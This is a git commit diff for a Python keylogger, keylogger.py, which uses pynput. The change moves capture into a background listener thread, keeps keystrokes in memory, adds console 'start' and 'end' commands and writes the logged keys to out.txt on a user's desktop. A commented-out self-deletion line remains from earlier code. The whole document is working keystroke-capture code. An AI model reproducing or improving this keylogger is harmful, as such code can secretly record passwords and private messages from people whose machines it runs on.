77319dfec6134c3959e5f117ed6850d21427f9bb
Sam <samsmith0817@gmail.com>
2020-04-30 11:27:03 -0400

    made keylogger able to start+stop, stores data in memory

--- keylogger.py
+++ keylogger.py
@@ -1,23 +1,42 @@
 from pynput.keyboard import Key, Listener
-import logging
-from os import remove
-from sys import argv
+
+
+output = []
+
+
+def on_press(key):
+    if key == Key.enter:
+        output.append("\n")
+    elif key == Key.space:
+        output.append(" ")
+    else:
+        output.append(str(key))
+
+
+def key_thread():
+    listener = Listener(on_press=on_press)
+    listener.start()
 
 
 def main():
     log_dir = "C:/users/samsm/desktop/"
-    f = ""
-    output = []
-    # logging.basicConfig(filename=(log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-    logging.basicConfig(filename=f, level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
-    def on_press(key):
-        output.append(logging.info(str(key)))
-
-    with Listener(on_press=on_press) as listener:
-        listener.join()
 
     # remove(argv[0])
+    com = input("Command: ")
+    started = False
+    while com != "end":
+        if com == "start" and not started:
+            key_thread()
+            started = True
+        print(output)
+        com = input("Command: ")
+
+    fi = open(log_dir + "out.txt", "w")
+    for i in output:
+        b = i.replace("\'", '')
+        print(b)
+        fi.write(b)
+    fi.close()
 
 
 if __name__ == "__main__":
